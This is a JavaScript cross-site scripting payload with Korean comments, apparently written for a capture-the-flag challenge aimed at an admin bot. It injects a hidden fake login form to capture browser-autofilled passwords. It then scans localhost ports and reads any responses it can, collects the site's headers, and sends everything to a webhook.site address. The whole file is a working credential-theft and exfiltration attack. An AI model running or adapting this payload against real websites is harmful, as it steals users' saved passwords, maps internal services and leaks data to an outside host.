(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 웹훅 주소

    // 1. [기법 A] 가짜 로그인 폼 주입 (Autofill 탈취)
    // 봇이 "127.0.0.1"에 대해 저장된 비밀번호(Flag)가 있다면,
    // 브라우저가 이 폼을 자동으로 채워줄 수 있습니다.
    const fakeForm = document.createElement('div');
    fakeForm.innerHTML = `
        <form id="fake-login" style="opacity:0; position:absolute; top:-9999px;">
            <input type="text" name="username" value="admin">
            <input type="password" name="password">
        </form>
    `;
    document.body.appendChild(fakeForm);

    // 브라우저가 채울 시간을 줌
    await new Promise(r => setTimeout(r, 1000));
    const passwordField = document.querySelector('input[type="password"]');
    const stolenPassword = passwordField ? passwordField.value : "No Input Found";

    // 2. [기법 B] 내부 포트 스캔 (Intranet Scanning)
    // 127.0.0.1의 8000~9000번 포트 등에 숨겨진 서비스가 있는지 확인합니다.
    const portsToScan = [80, 8080, 8000, 8888, 9000, 1337, 3000, 5001];
    let scanResults = {};

    for (let port of portsToScan) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1000); // 1초 타임아웃

            // no-cors 모드로 요청 (내용은 못 읽어도 에러 여부로 포트 오픈 확인 가능)
            // 만약 운 좋게 CORS가 열려있거나 단순 텍스트라면 읽힐 수도 있음
            const res = await fetch(`http://127.0.0.1:${port}/`, { 
                mode: 'no-cors', 
                signal: controller.signal 
            });
            clearTimeout(timeoutId);
            scanResults[port] = "Open (Status: " + res.status + ")";
            
            // 만약 읽을 수 있는 응답이라면 내용을 가져옴 (CORS 허용 시)
            try {
                // Same-Origin이 아니므로 mode: 'cors'가 필요하지만, 
                // 혹시 내부 서비스가 Access-Control-Allow-Origin: * 일 수 있음
                const textRes = await fetch(`http://127.0.0.1:${port}/`);
                const text = await textRes.text();
                scanResults[port + "_content"] = text.substring(0, 200); // 앞부분만
            } catch(e) {}

        } catch (e) {
            // 타임아웃이나 Connection Refused는 보통 닫힌 포트
            // scanResults[port] = "Closed/Error"; 
        }
    }

    // 3. [기법 C] 메인 페이지 헤더 전수 조사 (Header Injection 확인)
    // 지난번에 본문만 보고 헤더를 놓쳤을 수 있습니다.
    let indexHeaders = "";
    try {
        const res = await fetch('/', {method: 'HEAD'});
        for (const [k, v] of res.headers.entries()) {
            indexHeaders += `${k}: ${v}\n`;
        }
    } catch(e) { indexHeaders = e.toString(); }

    // 데이터 전송
    const data = {
        msg: "Phase 3 Data",
        autofillPassword: stolenPassword, // 여기에 Flag가 있을 수 있음
        internalPorts: JSON.stringify(scanResults), // 열린 포트 확인
        indexHeaders: indexHeaders, // 헤더 확인
        location: window.location.href
    };

    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
